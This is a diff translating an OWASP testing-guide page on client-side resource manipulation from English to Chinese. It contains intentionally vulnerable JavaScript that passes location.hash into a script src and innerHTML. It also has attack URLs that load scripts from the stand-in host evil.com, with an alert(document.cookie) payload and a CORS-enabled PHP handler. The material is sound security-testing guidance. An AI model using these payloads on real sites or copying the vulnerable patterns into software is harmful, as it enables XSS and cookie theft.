@@ -1,14 +1,14 @@
-# Testing for Client-side Resource Manipulation
+# 测试客户端资源操纵
 
 |ID          |
 |------------|
 |WSTG-CLNT-06|
 
-## Summary
+## 概述
 
-A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application's behavior by causing it to load and render malicious objects.
+客户端资源操纵漏洞是一种输入验证缺陷。当应用程序接受用户控制的输入指定资源的路径（如iframe、JavaScript、applet的源或XMLHttpRequest的处理程序）时，会发生此漏洞。此漏洞包括能够控制链接到网页上某些资源的URL的能力。影响因漏洞而异，通常采用进行XSS攻击的方式。此漏洞使通过导致其加载和呈现恶意对象来干扰预期应用程序的行为成为可能。
 
-The following JavaScript code shows a possible vulnerable script in which an attacker is able to control the `location.hash` (source) which reaches the attribute `src` of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.
+以下JavaScript代码显示了一个可能的易受攻击脚本，其中攻击者能够控制`location.hash`（源），该源到达脚本元素的`src`属性。这种特殊情况导致XSS攻击，因为可以注入外部JavaScript。
 
 ```html
 <script>
@@ -20,21 +20,21 @@ The following JavaScript code shows a possible vulnerable script in which an att
 </script>
 ```
 
-An attacker could target a victim by causing them to visit this URL:
+攻击者可能通过导致受害者访问此URL来锁定受害者：
 
 `www.victim.com/#https://evil.com/js.js`
 
-Where `js.js` contains:
+其中`js.js`包含：
 
 ```js
 alert(document.cookie)
 ```
 
-This would cause the alert to pop up on the victim's browser.
+这将导致警报弹出在受害者的浏览器上。
 
-A more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.
+更严重的场景涉及控制CORS请求中调用的URL。由于CORS允许通过基于头的方法使目标资源可被请求域访问，攻击者可能要求目标页面从自己的网站加载恶意内容。
 
-Here is an example of a vulnerable page:
+这是易受攻击页面的示例：
 
 ```html
 <b id="p"></b>
@@ -55,11 +55,11 @@ Here is an example of a vulnerable page:
 </script>
 ```
 
-The `location.hash` is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct `innerHTML`. An attacker could ask a victim to visit the following URL:
+`location.hash`由用户输入控制，用于请求外部资源，然后通过`innerHTML`构造反映。攻击者可能要求受害者访问以下URL：
 
 `www.victim.com/#https://evil.com/html.html`
 
-With the payload handler for `html.html`:
+使用`html.html`的有效载荷处理程序：
 
 ```html
 <?php
@@ -68,25 +68,25 @@ header('Access-Control-Allow-Origin: https://www.victim.com');
 <script>alert(document.cookie);</script>
 ```
 
-## Test Objectives
+## 测试目标
 
-- Identify sinks with weak input validation.
-- Assess the impact of the resource manipulation.
+- 识别具有弱输入验证的接收器。
+- 评估资源操纵的影响。
 
-## How to Test
+## 如何测试
 
-To manually check for this type of vulnerability, we must identify whether the application employs inputs without correctly validating them. If so, these inputs are under the control of the user and could be used to specify external resources. Since there are many resources that could be included in the application (such as images, video, objects, css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.
+要手动检查此类漏洞，我们必须识别应用程序是否使用输入而未正确验证它们。如果是这样，这些输入受用户控制，可用于指定外部资源。由于可能包含在应用程序中的资源很多（如图像、视频、对象、css和iframe），应调查处理相关URL的客户端脚本以发现潜在问题。
 
-The following table shows possible injection points (sink) that should be checked:
+以下表格显示了应检查的可能注入点（接收器）：
 
-| Resource Type   | Tag/Method                                | Sink   |
-| --------------- | ----------------------------------------- | ------ |
-| Frame           | iframe                                    | src    |
-| Link            | a                                         | href   |
-| AJAX Request    | `xhr.open(method, [url], true);` | URL    |
-| CSS             | link                                      | href   |
-| Image           | img                                       | src    |
-| Object          | object                                    | data   |
-| Script          | script                                    | src    |
+| 资源类型   | 标签/方法                                | 接收器   |
+| ----------- | ----------------------------------------- | -------- |
+| Frame       | iframe                                    | src     |
+| Link        | a                                         | href    |
+| AJAX请求    | `xhr.open(method, [url], true);` | URL     |
+| CSS         | link                                      | href    |
+| Image       | img                                       | src     |
+| Object      | object                                    | data    |
+| Script      | script                                    | src     |
 
-The most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities.
+最有趣的案例是那些允许攻击者包含可导致XSS漏洞的客户端代码（如JavaScript）的案例。
